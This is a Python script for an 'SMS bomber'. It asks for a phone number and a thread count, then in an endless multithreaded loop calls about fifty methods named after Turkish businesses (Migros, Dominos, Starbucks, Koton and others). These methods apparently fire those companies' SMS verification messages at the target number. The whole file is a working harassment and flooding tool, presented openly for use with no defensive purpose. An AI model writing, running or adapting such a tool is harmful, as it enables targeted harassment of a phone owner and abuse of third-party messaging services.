
from time import sleep
from os import system
from sms import SendSms
from concurrent.futures import ThreadPoolExecutor, wait
import threading

            

servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            servisler_sms.append(attribute)

            
system("cls||clear")

print("""\x1b[38;2;255;0;0m
                                                                       
                                                                       
▓█████ ▒███████▒
▓█   ▀ ▒ ▒ ▒ ▄▀░
▒███   ░ ▒ ▄▀▒░ 
▒▓█  ▄   ▄▀▒   ░
░▒████▒▒███████▒
░░ ▒░ ░░▒▒ ▓░▒░▒
 ░ ░  ░░░▒ ▒ ░ ▒
   ░   ░ ░ ░ ░ ░
   ░  ░  ░ ░
       ░  
""")

print("'0' for infinite threads.")

tc = int(input("Thread Count : "))

tel_no = input("Tel no : ")
    
mail = ""
send_sms = SendSms(tel_no, mail)
def job():
    with ThreadPoolExecutor() as executor:
        futures = [
            executor.submit(send_sms.Akasya),
            executor.submit(send_sms.Akbati),
            executor.submit(send_sms.Ayyildiz),
            executor.submit(send_sms.Baydoner),
            executor.submit(send_sms.Beefull),
            executor.submit(send_sms.Bim),
            executor.submit(send_sms.Bisu),
            executor.submit(send_sms.Bodrum),
            executor.submit(send_sms.Clickme),
            executor.submit(send_sms.Dominos),
            executor.submit(send_sms.Englishhome),
            executor.submit(send_sms.Evidea),
            executor.submit(send_sms.File),
            executor.submit(send_sms.Frink),
            executor.submit(send_sms.Happy),
            executor.submit(send_sms.Hayatsu),
            executor.submit(send_sms.Hey),
            executor.submit(send_sms.Hizliecza),
            executor.submit(send_sms.Icq),
            executor.submit(send_sms.Ipragaz),
            executor.submit(send_sms.Istegelsin),
            executor.submit(send_sms.Joker),
            executor.submit(send_sms.KahveDunyasi),
            executor.submit(send_sms.KimGb),
            executor.submit(send_sms.Komagene),
            executor.submit(send_sms.Koton),
            executor.submit(send_sms.KuryemGelsin),
            executor.submit(send_sms.Macro),
            executor.submit(send_sms.Metro),
            executor.submit(send_sms.Migros),
            executor.submit(send_sms.Naosstars),
            executor.submit(send_sms.Paybol),
            executor.submit(send_sms.Pidem),
            executor.submit(send_sms.Porty),
            executor.submit(send_sms.Qumpara),
            executor.submit(send_sms.Starbucks),
            executor.submit(send_sms.Suiste),
            executor.submit(send_sms.Taksim),
            executor.submit(send_sms.Tasdelen),
            executor.submit(send_sms.Tasimacim),
            executor.submit(send_sms.Tazi),
            executor.submit(send_sms.TiklaGelsin),
            executor.submit(send_sms.ToptanTeslim),
            executor.submit(send_sms.Ucdortbes),
            executor.submit(send_sms.Uysal),
            executor.submit(send_sms.Wmf),
            executor.submit(send_sms.Yapp),
            executor.submit(send_sms.YilmazTicaret),
            executor.submit(send_sms.Yuffi)
        ]
if tc == 0:
    system("cls||clear")
    threads = []
    while True:
        t = threading.Thread(target=job)
        threads.append(t) 
        t.start()
        
    
else:
    system("cls||clear")
    threads = []
    while True:
        for i in range(int(tc)):
            t = threading.Thread(target=job)
            threads.append(t)
            t.start()
        